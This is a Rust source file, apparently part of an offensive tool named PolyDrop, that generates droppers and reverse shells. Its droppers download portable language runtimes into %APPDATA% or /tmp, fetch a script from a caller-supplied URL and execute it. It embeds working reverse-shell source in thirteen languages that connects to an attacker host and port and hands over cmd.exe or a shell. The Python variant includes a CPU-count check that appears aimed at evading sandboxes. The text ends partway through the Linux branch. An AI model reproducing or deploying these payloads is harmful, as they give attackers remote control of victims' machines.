use std::fs::OpenOptions;
use std::io::Write;
use defaults::OS_TO_DOWNLOAD_HASHMAP;
pub mod arguments;
pub mod defaults;
pub mod payloads;
pub mod validate_urls;

fn get_lang_dl(lang: &str, platform: &str) -> Option<&'static str> {
    // Access the appropriate OS's download map
    if let Some(os_map) = OS_TO_DOWNLOAD_HASHMAP.get(platform) {
        // Access the language-specific URL within the OS map
        if let Some(url) = os_map.get(lang) {
            Some(url)
        } else {
            println!("No default download URL found for the given language.");
            None
        }
    } else {
        println!("No default download URL found for the given platform.");
        None
    }
}

pub fn payload_builder(
    platform: &str,
    language: &str,
    payload: &str,
    output: &str,
    allarg: &str,
    lhostarg: &str,
    lportarg: &str,
    urlarg: &str,
) {
    if platform == "windows" {

        let tcl_payload = format!("wget {} -O $env:APPDATA\\tclkitsh8.zip\nExpand-Archive -Path $env:APPDATA\\tclkitsh8.zip -DestinationPath $env:APPDATA\\tclkitsh8\nwget {}{}.tcl -O $env:APPDATA\\{}.tcl\n& \"$env:APPDATA\\tclkitsh8\\tclkitsh-8.5.9-win32-x86_64.exe\" @('$env:APPDATA\\{}.tcl')\n", &get_lang_dl("tcl", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let php_payload = format!("wget {} -O $env:APPDATA\\php8.zip\nExpand-Archive -Path $env:APPDATA\\php8.zip -DestinationPath $env:APPDATA\\php8\nwget {}{}.php -O $env:APPDATA\\{}.php\n& \"$env:APPDATA\\php8\\\\php.exe\" @('$env:APPDATA\\{}.php')\n", &get_lang_dl("php", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let crystal_payload = format!("wget {} -O $env:APPDATA\\crystalmethod.zip\nExpand-Archive -Path $env:APPDATA\\crystalmethod.zip -DestinationPath $env:APPDATA\\crystalmethod\nwget {}{}.cr -O $env:APPDATA\\{}.cr\n& \"$env:APPDATA\\crystalmethod\\\\crystal.exe\" @('run', '$env:APPDATA\\{}.cr')\n", &get_lang_dl("crystal", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let julia_payload = format!("wget {} -O $env:APPDATA\\juliachilds.zip\nExpand-Archive -Path $env:APPDATA\\juliachilds.zip -DestinationPath $env:APPDATA\\juliachilds\nwget {}{}.jl -O $env:APPDATA\\juliachilds\\\\{}.jl\n& \"$env:APPDATA\\juliachilds\\\\julia-1.10.2\\\\bin\\\\julia.exe\" @('$env:APPDATA\\juliachilds\\{}.jl')\n", &get_lang_dl("julia", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let go_payload = format!("wget {} -O $env:APPDATA\\go1.22.zip\nExpand-Archive -Path $env:APPDATA\\go.1.22.zip -DestinationPath $env:APPDATA\\go1.22\nwget {}{}.go -O $env:APPDATA\\{}.go\n& \"$env:APPDATA\\go1.22\\\\go\\\\bin\\\\go.exe\" @('run', '$env:APPDATA\\{}.go')\n", &get_lang_dl("golang", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let dart_payload = format!("wget {} -O $env:APPDATA\\dartwingduck.zip\nExpand-Archive -Path $env:APPDATA\\dartwingduck.zip -DestinationPath $env:APPDATA\\dartwingduck\nwget {}{}.dart -O $env:APPDATA\\dartwingduck\\\\{}.dart\n& \"$env:APPDATA\\dartwingduck\\\\dart-sdk\\\\bin\\\\dart.exe\" @('$env:APPDATA\\dartwingduck\\{}.dart')\n", &get_lang_dl("dart", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let d_payload = format!("wget {} -O $env:APPDATA\\deeznuts.zip\nExpand-Archive -Path $env:APPDATA\\deeznuts.zip -DestinationPath $env:APPDATA\\deeznuts\nwget {}{}.d -O $env:APPDATA\\deeznuts\\\\{}.d\n& \"$env:APPDATA\\deeznuts\\\\dmd2\\\\windows\\\\bin64\\\\dmd.exe\" @('$env:APPDATA\\deeznuts\\{}.d')\n", &get_lang_dl("dlang", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let v_payload = format!("wget {} -O $env:APPDATA\\vendetta.zip\nExpand-Archive -Path $env:APPDATA\\vendetta.zip -DestinationPath $env:APPDATA\\vendetta\nwget {}{}.v -O $env:APPDATA\\vendetta\\\\{}.v\n& \"$env:APPDATA\\vendetta\\\\v\\\\v.exe\" @('run', '$env:APPDATA\\vendetta\\{}.v')\n", &get_lang_dl("vlang", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let node_payload = format!("wget {} -O $env:APPDATA\\noodles.zip\nExpand-Archive -Path $env:APPDATA\\noodles.zip -DestinationPath $env:APPDATA\\noodles\nwget {}{}.js -O $env:APPDATA\\{}.js\n& \"$env:APPDATA\\noodles\\\\node-v20.12.2-win-x64\\\\node.exe\" @('$env:APPDATA\\noodles\\{}.js')\n", &get_lang_dl("nodejs", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let bun_payload = format!("wget {} -O $env:APPDATA\\bun.zip\nExpand-Archive -Path $env:APPDATA\\bun.zip -DestinationPath $env:APPDATA\nwget {}/{}.tsx -O $env:APPDATA\\{}.tsx\n& \"$env:APPDATA\\bun-windows-x64\\bun.exe\" @('run', \"$env:APPDATA\\{}.tsx\")\n", &get_lang_dl("bun", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let python_payload = format!("wget {} -O $env:APPDATA\\python3.zip\nExpand-Archive -Path $env:APPDATA\\python3.zip -DestinationPath $env:APPDATA\\python3\nwget {}{}.py -O $env:APPDATA\\python3\\\\{}.py\n& \"$env:APPDATA\\python3\\\\python.exe\" @('$env:APPDATA\\python3\\{}.py')\n", &get_lang_dl("python", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let fsharp_payload = format!("wget {} -O $env:APPDATA\\dotnet8.zip\nExpand-Archive -Path $env:APPDATA\\dotnet8.zip -DestinationPath $env:APPDATA\\dotnet8\nwget {}{}.fsx -O $env:APPDATA\\dotnet8\\\\{}.fsx\n& \"$env:APPDATA\\dotnet8\\\\dotnet.exe\" @('fsi', '$env:APPDATA\\dotnet8\\{}.fsx')\n", &get_lang_dl("fsharp", platform).unwrap().to_string(),  &urlarg, &output, &output, &output);
        let deno_payload = format!("wget {} -O $env:APPDATA\\deno-x86_64-pc-windows-msvc.zip\nExpand-Archive -Path $env:APPDATA\\deno-x86_64-pc-windows-msvc.zip -DestinationPath $env:APPDATA\nwget {}/{}.ts -O $env:APPDATA\\{}.ts\n& \"$env:APPDATA\\deno.exe\" @('run', '--allow-net', '--allow-run', \"$env:APPDATA\\{}.ts\")", &get_lang_dl("deno", platform).unwrap().to_string(), &urlarg, &output, &output, &output);

        let win_payloads = payloads::Payloads::new(
            &tcl_payload,
            &php_payload,
            &crystal_payload,
            &julia_payload,
            &go_payload,
            &dart_payload,
            &d_payload,
            &v_payload,
            &node_payload,
            &bun_payload,
            &python_payload,
            &fsharp_payload,
            &deno_payload,
        );
        let tcl_revshell = format!("set chan [socket {} {}]\nputs $chan \"PolyDrop Connection from TCL Payload\"\nwhile {{1}} {{\n\tflush $chan\n\tputs $chan [exec cmd /c [gets $chan]]\n\tflush $chan\n}}", &lhostarg, &lportarg);
        let php_revshell = format!("<?php\nclass Shell {{\n\tprivate $addr = null;\n\tprivate $port = null;\n\tprivate $os= null;\n\tprivate $shell = null;\n\tprivate $descriptorspec = array(\n\t\t0 => array('pipe', 'r'),\n\t\t1 => array('pipe', 'w'),\n\t\t2 => array('pipe', 'w')\n\t);\n\tprivate $buffer = 1024;\n\tprivate $clen = 0;\n\tprivate $error = false;\n\tprivate $sdump = true;\n\tpublic function __construct($addr, $port) {{\n\t\t$this->addr = $addr;\n\t\t$this->port = $port;\n\t}}\n\tprivate function detect() {{\n\t\t$detected = true;\n\t\t$os = PHP_OS;\n\t\tif (stripos($os, 'LINUX') !== false || stripos($os, 'DARWIN') !== false) {{\n\t\t\t$this->os= 'LINUX';\n\t\t\t$this->shell = '/bin/sh';\n\t\t}} else if (stripos($os, 'WINDOWS') !== false || stripos($os, 'WINNT') !== false || stripos($os, 'WIN32') !== false) {{\n\t\t\t$this->os= 'WINDOWS';\n\t\t\t$this->shell = 'cmd.exe';\n\t\t}} else {{\n\t\t\t$detected = false;\n\t\t\techo \"SYS_ERROR: Underlying operating system is not supported, script will now exit...\\n\";\n\t\t}}\n\t\treturn $detected;\n\t}}\n\tprivate function daemonize() {{\n\t\t$exit = false;\n\t\tif (!function_exists('pcntl_fork')) {{\n\t\t\techo \"DAEMONIZE: pcntl_fork() does not exists, moving on...\\n\";\n\t\t}} else if (($pid = @pcntl_fork()) < 0) {{\n\t\t\techo \"DAEMONIZE: Cannot fork off the parent process, moving on...\\n\";\n\t\t}} else if ($pid > 0) {{\n\t\t\t$exit = true;\n\t\t\techo \"DAEMONIZE: Child process forked off successfully, parent process will now exit...\\n\";\n\t\t}} else if (posix_setsid() < 0) {{\n\t\t\techo \"DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\\n\";\n\t\t}} else {{\n\t\t\techo \"DAEMONIZE: Completed successfully!\\n\";\n\t\t}}\n\t\treturn $exit;\n\t}}\n\tprivate function settings() {{\n\t\t@error_reporting(0);\n\t\t@set_time_limit(0);\n\t\t@umask(0);\n\t}}\n\tprivate function dump($data) {{\n\t\tif ($this->sdump) {{\n\t\t\t$data = str_replace('<', '&lt;', $data);\n\t\t\t$data = str_replace('>', '&gt;', $data);\n\t\t\techo $data;\n\t\t}}\n\t}}\n\tprivate function read($stream, $name, $buffer) {{\n\t\tif (($data = @fread($stream, $buffer)) === false) {{\n\t\t\t$this->error = true;\n\t\t\techo \"STRM_ERROR: Cannot read from {{$name}}, script will now exit...\\n\";\n\t\t}}\n\t\treturn $data;\n\t}}\n\tprivate function write($stream, $name, $data) {{\n\t\tif (($bytes = @fwrite($stream, $data)) === false) {{\n\t\t\t$this->error = true;\n\t\t\techo \"STRM_ERROR: Cannot write to {{$name}}, script will now exit...\\n\";\n\t\t}}\n\t\treturn $bytes;\n\t}}\n\tprivate function rw($input, $output, $iname, $oname) {{\n\t\twhile (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {{\n\t\t\tif ($this->os === 'WINDOWS' && $oname === 'STDIN') {{ $this->clen += strlen($data); }}\n\t\t\t$this->dump($data);\n\t\t}}\n\t}}\n\tprivate function brw($input, $output, $iname, $oname) {{\n\t\t$size = fstat($input)['size'];\n\t\tif ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {{\n\t\t\twhile ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {{\n\t\t\t\t$this->clen -= $bytes;\n\t\t\t\t$size -= $bytes;\n\t\t\t}}\n\t\t}}\n\t\twhile ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {{\n\t\t\t$size -= $bytes;\n\t\t\t$this->dump($data);\n\t\t}}\n\t}}\n\tpublic function run() {{\n\t\tif ($this->detect() && !$this->daemonize()) {{\n\t\t\t$this->settings();\n\t\t\t$socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);\n\t\t\t@fwrite($socket, \"PolyDrop Connection from PHP Payload\n\");\n\t\t\tif (!$socket) {{\n\t\t\t\techo \"SOC_ERROR: {{$errno}}: {{$errstr}}\\n\";\n\t\t\t}} else {{\n\t\t\t\tstream_set_blocking($socket, false);\n\t\t\t\t$process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);\n\t\t\t\tif (!$process) {{\n\t\t\t\t\techo \"PROC_ERROR: Cannot start the shell\\n\";\n\t\t\t\t}} else {{\n\t\t\t\t\tforeach ($pipes as $pipe) {{\n\t\t\t\t\t\tstream_set_blocking($pipe, false);\n\t\t\t\t\t}}\n\t\t\t\t\t$status = proc_get_status($process);\n\t\t\t\t\t@fwrite($socket, \"SOCKET: Shell has connected! PID: {{$status['pid']}}\\n\");\n\t\t\t\t\tdo {{\n\t\t\t\t\t\t$status = proc_get_status($process);\n\t\t\t\t\t\tif (feof($socket)) {{\n\t\t\t\t\t\t\techo \"SOC_ERROR: Shell connection has been terminated\\n\"; break;\n\t\t\t\t\t\t}} else if (feof($pipes[1]) || !$status['running']) {{\n\t\t\t\t\t\t\techo \"PROC_ERROR: Shell process has been terminated\\n\";break;\n\t\t\t\t\t\t}}\n\t\t\t\t\t\t$streams = array(\n\t\t\t\t\t\t\t'read' => array($socket, $pipes[1], $pipes[2]),\n\t\t\t\t\t\t\t'write' => null,\n\t\t\t\t\t\t\t'except' => null\n\t\t\t\t\t\t);\n\t\t\t\t\t\t$num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0);\n\t\t\t\t\t\tif ($num_changed_streams === false) {{\n\t\t\t\t\t\t\techo \"STRM_ERROR: stream_select() failed\\n\"; break;\n\t\t\t\t\t\t}} else if ($num_changed_streams > 0) {{\n\t\t\t\t\t\t\tif ($this->os === 'LINUX') {{\n\t\t\t\t\t\t\t\tif (in_array($socket , $streams['read'])) {{ $this->rw($socket , $pipes[0], 'SOCKET', 'STDIN' ); }}\n\t\t\t\t\t\t\t\tif (in_array($pipes[2], $streams['read'])) {{ $this->rw($pipes[2], $socket , 'STDERR', 'SOCKET'); }}\n\t\t\t\t\t\t\t\tif (in_array($pipes[1], $streams['read'])) {{ $this->rw($pipes[1], $socket , 'STDOUT', 'SOCKET'); }}\n\t\t\t\t\t\t\t}} else if ($this->os === 'WINDOWS') {{\n\t\t\t\t\t\t\t\tif (in_array($socket, $streams['read'])/*------*/) {{ $this->rw ($socket , $pipes[0], 'SOCKET', 'STDIN' ); }}\n\t\t\t\t\t\t\t\tif (($fstat = fstat($pipes[2])) && $fstat['size']) {{ $this->brw($pipes[2], $socket , 'STDERR', 'SOCKET'); }}\n\t\t\t\t\t\t\t\tif (($fstat = fstat($pipes[1])) && $fstat['size']) {{ $this->brw($pipes[1], $socket , 'STDOUT', 'SOCKET'); }}\n\t\t\t\t\t\t\t}}\n\t\t\t\t\t\t}}\n\t\t\t\t\t}} while (!$this->error);\n\t\t\t\t\tforeach ($pipes as $pipe) {{\n\t\t\t\t\t\tfclose($pipe);\n\t\t\t\t\t}}\n\t\t\t\t\tproc_close($process);\n\t\t\t\t}}\n\t\t\t\tfclose($socket);\n\t\t\t}}\n\t\t}}\n\t}}\n}}\necho '<pre>';\n$sh = new Shell('{}', {});\n$sh->run();\nunset($sh);\necho '</pre>';\n?>", &lhostarg, &lportarg);
        let crystal_revshell = format!("require \"process\"\nrequire \"socket\"\n\nc = Socket.tcp(Socket::Family::INET)\nc.connect(\"{}\", {})\nc.puts(\"PolyDrop Connection from Crystal Payload\")\nloop do\n\tm, l = c.receive\n\tp = Process.new(m.rstrip(\"\\n\"), output:Process::Redirect::Pipe, shell:true)\n\tc << p.output.gets_to_end\nend", &lhostarg, &lportarg);
        let julia_revshell = format!("using Sockets\n\nc = connect(\"{}\", {});\nmessage = \"PolyDrop Connection from Julia Payload\"\nmessage_bytes = string(message) |> x -> convert(Vector{{UInt8}}, x)\nwrite(c, message_bytes)\nwhile true\n\tcmd = readline(c, keep=true);\n\ttry\n\t\tprintln(c, read(`cmd.exe /c $cmd`, String));\n\tcatch e\n\t\tprint(c, e)\n\tend\nend", &lhostarg, &lportarg);
        let go_revshell = format!("package main;import\"os/exec\";import \"net\";import \"fmt\";func main(){{c,_:=net.Dial(\"tcp\",\"{}:{}\");message := \"PolyDrop Connection from Golang Payload\\n\";_, err := fmt.Fprintf(c, message);if err != nil {{fmt.Printf(\"Error sending message: %v\\n\", err);return}};cmd:=exec.Command(\"cmd.exe\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}", &lhostarg, &lportarg);
        let dart_revshell = format!("import 'dart:io';\nimport 'dart:convert';\n\nmain() {{\n\tSocket.connect(\"{}\", {}).then((socket) {{\n\t\tvar message = \"PolyDrop Connection from Dart Payload\n\";var messageBytes = utf8.encode(message);socket.add(messageBytes);socket.listen((data) {{\n\t\t\tProcess.start('powershell.exe', []).then((Process process) {{\n\t\t\t\tprocess.stdin.writeln(new String.fromCharCodes(data).trim());\n\t\t\t\tprocess.stdout\n\t\t\t\t\t.transform(utf8.decoder)\n\t\t\t\t\t.listen((output) {{ socket.write(output); }});\n\t\t\t}});\n\t\t}},\n\t\tonDone: () {{\n\t\t\tsocket.destroy();\n\t\t}});\n\t}});\n}}", &lhostarg, &lportarg);
        let d_revshell = format!("import std.process, std.socket, std.conv;\n\nvoid main()\n{{\n\tSocket sock = new TcpSocket(new InternetAddress(\"{}\", {}));\n\tstring message = \"PolyDrop Connection from D-Lang Payload\n\";auto messageBytes = message.toUTF8();sock.send(messageBytes);\n\twhile (true)\n\t{{\n\t\tchar[] line;\n\t\tchar[1] buf;\n\t\twhile(sock.receive(buf))\n\t\t{{\n\t\t\tline ~= buf;\n\t\t\tif (buf[0] == '\\n')\n\t\t\t\tbreak;\n\t\t}}\n\t\tif (!line.length)\n\t\t\tbreak;\n\n\t\tauto os = executeShell(line);\n\t\tsock.send(os.output);\n\t}}\n}}", &lhostarg, &lportarg);
        let v_revshell = format!("module main\n\nimport net\nimport io\nimport os\n\nfn exec(path string) string {{\n\tmut out := ''\n\tmut line := ''\n\tmut cmd := os.Command{{\n\t\tpath: path\n\t}}\n\tcmd.start() or {{ panic(err) }}\n\n\tfor {{\n\t\tline = cmd.read_line()\n\t\tout += line + '\\n'\n\t\tif cmd.eof {{\n\t\t\treturn out\n\t\t}}\n\t}}\n\treturn out\n}}\n\nfn main() {{\n\tmut conn := net.dial_tcp('{}:{}')!\n\tmessage := \"PolyDrop Connection from V-Lang Payload\\n\";message_bytes := message.bytes();conn.write(message_bytes)!\n\tmut reader := io.new_buffered_reader(reader: conn)\n\tfor {{\n\t\tresult := reader.read_line() or {{ return }}\n\t\tconn.write_string(exec(result) + '\n') or {{ return }}\n\t}}\n}}", &lhostarg, &lportarg);
        let node_revshell = format!("(function(){{\n\tvar net = require(\"net\"),\n\t\tcp = require(\"child_process\"),\n\t\tsh = cp.spawn(\"cmd.exe\", []);\n\tvar client = new net.Socket();\n\tclient.connect({}, \"{}\", function(){{\n\t\tconst message = \"PolyDrop Connection from Node.js Payload\\n\";client.write(message);\n\t\tclient.pipe(sh.stdin);\n\t\tsh.stdout.pipe(client);\n\t\tsh.stderr.pipe(client);\n\t}});\n\treturn /a/;\n}})();", &lportarg, &lhostarg);
        let bun_revshell = format!("const net = require('net');\nconst {{ exec }} = require('child_process');\n\nconst IP = '{}';\nconst PORT = {};\n\nconst client = new net.Socket();\n\nclient.connect(PORT, IP, () => {{\n\tconsole.log('Connected to server');\n\tclient.write('PolyDrop Connection from Bun Payload\\n');\n}});\n\nclient.on('data', (data) => {{\n\texec(data.toString(), (error, stdout, stderr) => {{\n\t\tif (error) {{\n\t\t\tclient.write(`Error: ${{error.message}}\n`);\n\t\t\treturn;\n\t\t}}\n\t\tif (stderr) {{\n\t\t\tclient.write(`Stderr: ${{stderr}}\n`);\n\t\t\treturn;\n\t\t}}\n\t\tclient.write(stdout);\n\t}});\n}});\n\nclient.on('close', () => {{\n\tconsole.log('Connection closed');\n\tprocess.exit(0);\n}});", &lhostarg, &lportarg);
        let python_revshell = format!("import os\nimport socket\nimport subprocess\n\nif os.cpu_count() <= 2:\n\tquit()\n\nHOST = '{}'\nPORT = {}\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((HOST, PORT))\nmessage = \"PolyDrop Connection from Python Payload\\n\";s.sendall(message.encode())\n\nwhile 1:\n\ttry:\n\t\ts.send(str.encode(os.getcwd() + \"> \"))\n\t\tdata = s.recv(1024).decode(\"UTF-8\")\n\t\tdata = data.strip('\\n')\n\t\tif data == \"quit\": \n\t\t\tbreak\n\t\tif data[:2] == \"cd\":\n\t\t\tos.chdir(data[3:])\n\t\tif len(data) > 0:\n\t\t\tproc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n\t\t\tstdout_value = proc.stdout.read() + proc.stderr.read()\n\t\t\toutput_str = str(stdout_value, \"UTF-8\")\n\t\t\ts.send(str.encode(\"\\n\" + output_str))\n\texcept Exception as e:\n\t\tcontinue\n\ns.close()", &lhostarg, &lportarg);
        let fsharp_revshell = format!("open System\nopen System.Net\nopen System.Diagnostics\n\nlet rec asyncStdin (stream: System.Net.Sockets.NetworkStream, cmd: Process) =\n\tasync {{\n\t\tlet input = stream.ReadByte() |> Char.ConvertFromUtf32\n\t\tcmd.StandardInput.Write(input)\n\n\t\treturn! asyncStdin (stream, cmd)\n\t}}\n\nlet rec asyncStdout (stream: System.Net.Sockets.NetworkStream, cmd: Process) =\n\tasync {{\n\t\tlet output = cmd.StandardOutput.Read() |> Char.ConvertFromUtf32\n\t\tlet outbyte = System.Text.Encoding.UTF32.GetBytes(output)\n\t\tstream.Write(outbyte, 0, outbyte.Length)\n\n\t\treturn! asyncStdout (stream, cmd)\n\t}}\n\nlet main =\n\tlet client = new System.Net.Sockets.TcpClient()\n\n\tclient.Connect(\"{}\", {})\n\n\tlet stream = client.GetStream()\n\tlet message = \"PolyDrop Connection from F# Payload\\n\";let messageBytes = Encoding.UTF8.GetBytes(message);stream.Write(messageBytes, 0, messageBytes.Length)\n\tlet procStartInfo = ProcessStartInfo (\n\t\tFileName = \"cmd.exe\",\n\t\tRedirectStandardInput = true,\n\t\tRedirectStandardOutput = true,\n\t\tRedirectStandardError = true,\n\t\tUseShellExecute = false,\n\t\tCreateNoWindow = true\n\t)\n\n\tlet cmd = new Process(StartInfo = procStartInfo)\n\tlet err = cmd.Start()\n\n\tasyncStdin (stream, cmd) |> Async.Start\n\tasyncStdout (stream, cmd) |> Async.RunSynchronously\n\n\tstream.Flush()\n\n\tSystem.Threading.Thread.Sleep(TimeSpan.FromSeconds(30.0))\n\nmain", &lhostarg, &lportarg);
        let deno_revshell = format!("const IP = \"{}\";\nconst PORT = {};\n\nasync function connect(ip: string, port: number) {{\n\tconst conn = await Deno.connect({{ hostname: ip, port: port }});\n\tconsole.log(`Connected to ${{ip}}:${{port}}`);\n\n\tawait conn.write(new TextEncoder().encode(\"PolyDrop Connection from Deno Payload\\n\"));\n\n\tconst buffer = new Uint8Array(1024);\n\twhile (true) {{\n\t\tconst n = await conn.read(buffer);\n\t\tif (n === null) break;\n\t\tconst command = new TextDecoder().decode(buffer.subarray(0, n)).trim();\n\t\tconsole.log(`Received: ${{command}}`);\n\n\t\ttry {{\n\t\t\tconst process = Deno.run({{\n\t\t\t\tcmd: [\"cmd.exe\", \"/c\", command],\n\t\t\t\tstdout: \"piped\",\n\t\t\t\tstderr: \"piped\",\n\t\t\t}});\n\n\t\t\tconst output = await process.output();\n\t\t\tconst error = await process.stderrOutput();\n\n\t\t\tconst combinedOutput = new Uint8Array([...output, ...error]);\n\t\t\tawait conn.write(combinedOutput);\n\n\t\t\tprocess.close();\n\t\t}} catch (err) {{\n\t\t\tawait conn.write(new TextEncoder().encode(`Error: ${{err.message}}\n`));\n\t\t}}\n\t}}\n\n\tconn.close();\n}}\n\nconnect(IP, PORT);",  &lhostarg, &lportarg);
        let reverse_shell = payloads::Codex::new(
            &tcl_revshell,
            &php_revshell,
            &crystal_revshell,
            &julia_revshell,
            &go_revshell,
            &dart_revshell,
            &d_revshell,
            &v_revshell,
            &node_revshell,
            &bun_revshell,
            &python_revshell,
            &fsharp_revshell,
            &deno_revshell,
        );
        let p_res = if language == "tcl" {
            win_payloads.tcl_payload()
        } else if language == "php" {
            win_payloads.php_payload()
        } else if language == "crystal" {
            win_payloads.crystal_payload()
        } else if language == "julia" {
            win_payloads.julia_payload()
        } else if language == "golang" {
            win_payloads.go_payload()
        } else if language == "dart" {
            win_payloads.dart_payload()
        } else if language == "dlang" {
            win_payloads.d_payload()
        } else if language == "vlang" {
            win_payloads.v_payload()
        } else if language == "nodejs" {
            win_payloads.node_payload()
        } else if language == "bun" {
            win_payloads.bun_payload()
        } else if language == "python" {
            win_payloads.python_payload()
        } else if language == "fsharp" {
            win_payloads.fsharp_payload()
        } else if language == "deno" {
            win_payloads.deno_payload()
        } else if language == "empty" {
            "Building payload for every language...".to_string()
        } else {
            arguments::getargs()
        }
        .to_string();

        let p_shell = if language == "tcl" {
            reverse_shell.tcl_revshell()
        } else if language == "php" {
            reverse_shell.php_revshell()
        } else if language == "crystal" {
            reverse_shell.crystal_revshell()
        } else if language == "julia" {
            reverse_shell.julia_revshell()
        } else if language == "golang" {
            reverse_shell.go_revshell()
        } else if language == "dart" {
            reverse_shell.dart_revshell()
        } else if language == "dlang" {
            reverse_shell.d_revshell()
        } else if language == "vlang" {
            reverse_shell.v_revshell()
        } else if language == "nodejs" {
            reverse_shell.node_revshell()
        } else if language == "bun" {
            reverse_shell.bun_revshell()
        } else if language == "python" {
            reverse_shell.python_revshell()
        } else if language == "fsharp" {
            reverse_shell.f_revshell()
        } else if language == "deno" {
            reverse_shell.deno_revshell()
        } else if language == "empty" {
            "Building payload for every language...".to_string()
        } else {
            arguments::getargs()
        }
        .to_string();

        let p_ext = if language == "tcl" {
            ".tcl".to_string()
        } else if language == "php" {
            ".php".to_string()
        } else if language == "crystal" {
            ".cr".to_string()
        } else if language == "julia" {
            ".jl".to_string()
        } else if language == "golang" {
            ".go".to_string()
        } else if language == "dart" {
            ".dart".to_string()
        } else if language == "dlang" {
            ".d".to_string()
        } else if language == "vlang" {
            ".v".to_string()
        } else if language == "nodejs" {
            ".js".to_string()
        } else if language == "bun" {
            ".tsx".to_string()
        } else if language == "python" {
            ".py".to_string()
        } else if language == "fsharp" {
            ".fsx".to_string()
        } else if language == "deno" {
            ".ts".to_string()
        } else if language == "empty" {
            "Building payload for every language...".to_string()
        } else {
            arguments::getargs()
        }
        .to_string();

        let ext = if payload == "pwsh" || payload == "PowerShell" || payload == "powershell" {
            ".ps1"
        } else {
            ".sh"
        }
        .to_string();
        let outfile = output.to_string() + &ext;
        let revfile = output.to_string() + &p_ext;
        if allarg == "true" {
            for payload in [
                &win_payloads.tcl_payload(),
                &win_payloads.php_payload(),
                &win_payloads.crystal_payload(),
                &win_payloads.julia_payload(),
                &win_payloads.go_payload(),
                &win_payloads.dart_payload(),
                &win_payloads.d_payload(),
                &win_payloads.v_payload(),
                &win_payloads.node_payload(),
                &win_payloads.bun_payload(),
                &win_payloads.python_payload(),
                &win_payloads.fsharp_payload(),
                &win_payloads.deno_payload(),
            ]
            .iter()
            {
                //println!("{}", payload);
                // Open a file with append option
                let mut data_file = OpenOptions::new()
                    .create(true)
                    .append(true)
                    .open(&outfile)
                    .expect("cannot open file");

                // Write to a file
                data_file
                    .write_all(payload.as_bytes())
                    .expect("write failed");
            }
            let source_array = [
                &reverse_shell.tcl_revshell(),
                &reverse_shell.php_revshell(),
                &reverse_shell.crystal_revshell(),
                &reverse_shell.julia_revshell(),
                &reverse_shell.go_revshell(),
                &reverse_shell.dart_revshell(),
                &reverse_shell.d_revshell(),
                &reverse_shell.v_revshell(),
                &reverse_shell.node_revshell(),
                &reverse_shell.bun_revshell(),
                &reverse_shell.python_revshell(),
                &reverse_shell.f_revshell(),
                &reverse_shell.deno_revshell(),
            ];
            let ext_array = [
                ".tcl".to_string(),
                ".php".to_string(),
                ".cr".to_string(),
                ".jl".to_string(),
                ".go".to_string(),
                ".dart".to_string(),
                ".d".to_string(),
                ".v".to_string(),
                ".js".to_string(),
                ".tsx".to_string(),
                ".py".to_string(),
                ".r".to_string(),
                ".fsx".to_string(),
                ".ts".to_string(),
            ];
            for (revcode, revext) in source_array.iter().zip(ext_array.iter()) {
                let payloadfile = output.to_string() + &revext;
                let mut revshell_source =
                    std::fs::File::create(payloadfile).expect("create failed");
                revshell_source
                    .write_all(revcode.as_bytes())
                    .expect("write failed");
            }
        } else {
            let mut payload_main = std::fs::File::create(outfile).expect("create failed");
            payload_main
                .write_all(p_res.as_bytes())
                .expect("write failed");
            let mut revshell_source = std::fs::File::create(revfile).expect("create failed");
            revshell_source
                .write_all(p_shell.as_bytes())
                .expect("write failed");
        }
    } else if platform == "linux" {
        let tcl_payload = format!("wget {} -O /tmp/tclkit8.gz;gzip -d /tmp/tclkit8.gz;chmod +x /tmp/tclkit8;wget {}/{}.tcl -O /tmp/{}.tcl;/tmp/tclkit8 /tmp/{}.tcl", &get_lang_dl("tcl", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let php_payload = format!("wget {} -O /tmp/php8.tar.gz;tar xzvf /tmp/php8.tar.gz -C /tmp;chmod +x ./tmp/php;wget {}/{}.php -O /tmp/{}.php;/tmp/php /tmp/{}.php", &get_lang_dl("php", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let crystal_payload = format!("wget {} -O /tmp/crystal.tar.gz;tar xzvf crystal.tar.gz -C /tmp;chmod +x /tmp/crystal-1.12.1-1/bin/crystal;wget wget {}/{}.cr -O /tmp/{}.cr;/tmp/crystal-1.12.1-1/bin/crystal run /tmp/{}.cr", &get_lang_dl("crystal", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let julia_payload = format!("wget {} -O /tmp/julia.tar.gz;tar xzvf /tmp/julia.tar.gz -C /tmp;chmod +x /tmp/julia-1.10.3/bin/julia;wget {}/{}.jl -O /tmp/{}.jl;/tmp/julia-1.10.3/bin/julia /tmp/{}.jl", &get_lang_dl("julia", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
        let go_payload = format!("wget {} -O /tmp/go.tar.gz;tar xzvf /tmp/go.tar.gz -C /tmp;chmod +x /tmp/go/bin/go;wget {}/{}.go -O /tmp/{}.go;/tmp/go/bin/go run /tmp/{}.go", &get_lang_dl("golang", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
